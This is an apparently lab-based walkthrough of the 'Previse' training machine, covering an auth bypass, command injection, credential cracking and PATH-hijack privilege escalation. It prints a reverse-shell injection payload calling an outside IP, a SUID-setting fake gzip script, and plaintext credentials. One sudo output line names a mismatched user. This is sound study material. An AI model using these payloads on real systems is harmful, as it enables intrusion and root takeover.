# Previse

**Difficulty:** Easy | **OS:** Linux | **IP:** `10.129.95.185`

## Summary
**Previse** is an easy-difficulty Linux machine that highlights the risks of authentication bypasses through Execution After Redirect (EAR) flaws, command injection in administrative management scripts, database credential reuse, and PATH hijacking via insecure `sudo` commands. Initial access is achieved by bypassing authentication controls on administrative pages using Burp Suite response manipulation, locating database credentials in `config.php`, and exploiting a command injection vulnerability in a log-processing utility. Lateral movement to user `m4lwhere` is completed by cracking hashed passwords recovered from the database. Finally, privilege escalation to `root` is performed by exploiting a PATH hijacking vulnerability in an administrative backup script executed with elevated privileges.

## Reconnaissance

### Port Scanning (Nmap)
We begin by enumerating active TCP ports and identifying service versions:

- **22**: OpenSSH 7.6p1 (Ubuntu 4ubuntu0.3)
- **80**: Apache httpd 2.4.29

### Web Application & EAR Vulnerability
1) Fuzzing the web application uncovers several internal pages (`status.php`, `files.php`, `accounts.php`) that issue a 302 redirect to `login.php`.
2) Execution After Redirect (EAR): Intercepting the server's response using a proxy (such as Burp Suite) and changing the HTTP response status code from `302` to `200` allows rendering restricted pages directly in the browser without authenticating.
3) Accessing the application via this method permits creating a new administrative user account or exploring internal features like file logs (`file_logs.php`), which identifies a system user named `m4lwhere`.
4) Reviewing downloaded application source code files reveals database connection strings inside `config.php`:

Database Credentials: `root` : `mySQL_p@ssw0rd!:)`

## Exploitation (Initial Access)

### Command Injection in Log Processing
Inspecting `logs.php` reveals an interface where users can select a delimiter to process system logs. The backend script passes this user-supplied parameter directly into a Python script via system execution functions:

```$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");```

- **Vulnerability Mechanism:** The application fails to sanitize the `delim` POST parameter before passing it to the shell execution sink, enabling arbitrary command injection.
- **Execution:**

1) Submitting a crafted `delim` payload containing command separators (`tab; ...`) triggers execution of a reverse shell:

```delim=tab; bash -c "bash -i >& /dev/tcp/10.10.14.28/443 0>&1"```

2) Catching the incoming connection establishes an interactive session under the service user account.

## Lateral Movement (m4lwhere)

### Database Credential Harvesting & Cracking
1) Authenticating to the local MySQL instance using the credentials found in `config.php`:

```mysql -uroot -pmySQL_p@ssw0rd!:)```

2) Querying the application database (`previse`) exposes user account records and password hashes from the `accounts` table:
   - **Target User:** `m4lwhere`
   - **Hash:** `$1$🧂llol$DQpmdvnb7EeuO6UaqRItf`.

3) Cracking the MD5-crypt hash using `hashcat` and a standard wordlist (`rockyou.txt`):

```hashcat -m 500 hash /usr/share/wordlists/rockyou.txt```

**Recovered Password:** `ilovecody112235!`

4) Authenticating via SSH using these credentials (`m4lwhere` : `ilovecody112235!`) grants access to user files and the `user.txt` flag.

## Privilege Escalation (Root Flag)

### Sudo Permission Enumeration
Checking assigned `sudo` execution rights for user m4lwhere via `sudo -l`:

```
User mtz may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
```

Inspecting the contents of `/opt/scripts/access_backup.sh`:

```
#!/bin/bash
gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```

- **Vulnerability Analysis:** The script invokes system binaries like `gzip` using relative paths instead of absolute system paths (`/bin/gzip`). Additionally, the backup script runs with `root` privileges via `sudo` or scheduled cron tasks.

### PATH Hijacking
Because `gzip` is called without specifying its absolute path, the shell searches directories defined in the `PATH` environment variable sequentially.

- **Privilege Escalation Workflow:**
  1) Create a malicious script named `gzip` inside a writable directory (e.g., `/tmp`):

```
cd /tmp
echo '#!/bin/bash' > gzip
echo 'chmod u+s /bin/bash' >> gzip
chmod +x gzip
```

  2) Prepend `/tmp` to the front of the `PATH` environment variable so the system finds the malicious `gzip` binary before the legitimate one:

```export PATH=/tmp:$PATH```

  3) Execute the sudo-restricted script:

```sudo -u root /opt/scripts/access_backup.sh```

  4) When the script executes `gzip`, it runs the malicious script with `root` privileges, setting the SUID permission bit on `/bin/bash`.
  5) Spawn an interactive privileged shell:

```bash -p```

Full administrative `root` access is acquired, enabling retrieval of `root.txt` from `/root/root.txt`.
